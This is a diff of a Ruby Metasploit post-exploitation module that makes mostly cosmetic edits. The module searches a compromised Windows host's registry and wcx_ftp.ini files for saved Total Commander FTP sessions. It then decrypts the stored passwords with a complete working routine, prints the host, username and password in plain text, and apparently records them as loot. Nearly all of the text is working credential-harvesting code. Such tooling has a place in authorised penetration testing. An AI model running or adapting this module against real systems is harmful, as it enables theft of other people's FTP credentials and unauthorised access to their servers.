@@ -45,20 +45,20 @@ class Metasploit3 < Msf::Post
     hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
     case hklmpath
     when nil
-      print_status('Total Commander Does not Appear to be Installed Globally')
+      print_status('Total Commander does not appear to be installed globally')
     when 'wcx_ftp.ini'
-      print_status("Already Checked SYSTEMROOT")
+      print_status("Already checked SYSTEMROOT")
     when '.\\wcx_ftp.ini'
       hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''
       if hklminstpath.empty?
         print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')
       else
-        check_other(hklminstpath +'\\wcx_ftp.ini')
+        check_other(hklminstpath + '\\wcx_ftp.ini')
       end
     when /APPDATA/
-      print_status('Already Checked AppData')
+      print_status('Already checked AppData')
     when /USERPROFILE/
-      print_status('Already Checked USERPROFILE')
+      print_status('Already checked USERPROFILE')
     else
       check_other(hklmpath)
     end
@@ -72,9 +72,9 @@ class Metasploit3 < Msf::Post
       print_status("HKUP: #{hkupath}")
       case hkupath
       when nil
-        print_status('Total Commander Does not Appear to be Installed on This User')
+        print_status('Total Commander does not appear to be installed for the current user')
       when 'wcx_ftp.ini'
-        print_status("Already Checked SYSTEMROOT")
+        print_status('Already checked SYSTEMROOT')
       when '.\\wcx_ftp.ini'
         hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''
         if hklminstpath.empty?
@@ -94,7 +94,6 @@ class Metasploit3 < Msf::Post
     unload_our_hives(userhives)
 
   end
-
 
   def check_userdir(path)
     filename = "#{path}\\wcx_ftp.ini"
@@ -156,14 +155,13 @@ class Metasploit3 < Msf::Post
       next if group == 'General' or group == 'default' or group == 'connections'
       print_status("Processing Saved Session #{group}")
       host = ini[group]['host']
-
       username = ini[group]['username']
       passwd = ini[group]['password']
       next if passwd == nil
       passwd = decrypt(passwd)
       (host,port) = host.split(':')
       port = 21 if port == nil
-      print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
+      print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
       if session.db_record
         source_id = session.db_record.id
       else
@@ -182,7 +180,7 @@ class Metasploit3 < Msf::Post
 
   def seed(nMax)
     @vseed = ((@vseed * 0x8088405) & 0xffffffff) +1
-    return (((@vseed * nMax) >> 32)& 0xffffffff)
+    return (((@vseed * nMax) >> 32) & 0xffffffff)
   end
 
   def shift(n1, n2)
@@ -192,48 +190,44 @@ class Metasploit3 < Msf::Post
     return retval
   end
 
-  def decrypt(pwd)
+  def decrypt(enc_password)
 
-    pwd2=[]
+    # place_holder_1 is the first place holder for intermediate decryption result
+    place_holder_1 = []
+    enc_password.scan(/../) { |a| place_holder_1 << (a.to_i 16) }
+    len = (place_holder_1.length) - 4
 
-    pwd.scan(/../) { |a| pwd2 << (a.to_i 16) }
-
-    len= (pwd2.length) -4
-
-    pwd3=[]
+    # place_holder_2 is the second place holder for intermediate decryption results
+    place_holder_2 = []
     @vseed = 849521
-    pwd2.each do |a|
-      blah = seed(8)
-      blah2 = shift(a, blah)
-      pwd3 << blah2
+    place_holder_1.each do |a|
+      shifted_seed = shift(a, seed(8))
+      place_holder_2 << shifted_seed
     end
 
-    @vseed =12345
+    @vseed = 12345
     (0..255).each do |i|
-      a=seed(len)
-      b=seed(len)
-      t=pwd3[a]
-      pwd3[a] = pwd3[b]
-      pwd3[b] = t
+      a = seed(len)
+      b = seed(len)
+      # t is the temp variable for storing intermediate result of swap operation
+      t = place_holder_2[a]
+      place_holder_2[a] = place_holder_2[b]
+      place_holder_2[b] = t
     end
 
-
-    @vseed =42340
+    @vseed = 42340
     (0..len).each do |i|
-      pwd3[i] = (pwd3[i] ^ seed(256)) & 0xff
+      place_holder_2[i] = (place_holder_2[i] ^ seed(256)) & 0xff
     end
 
-
-    @vseed =54321
+    @vseed = 54321
     (0..len).each do |i|
-      foo = seed(256)
-      pwd3[i] =  (pwd3[i] - foo) & 0xff
+      seed = seed(256)
+      place_holder_2[i] = (place_holder_2[i] - seed) & 0xff
     end
 
-
-    fpwd = ""
-    pwd3[0,len].map{|a| fpwd << a.chr}
-    return fpwd
-
+    decrypted_password = ""
+    place_holder_2[0,len].map{ |a| decrypted_password << a.chr }
+    return decrypted_password
   end
 end
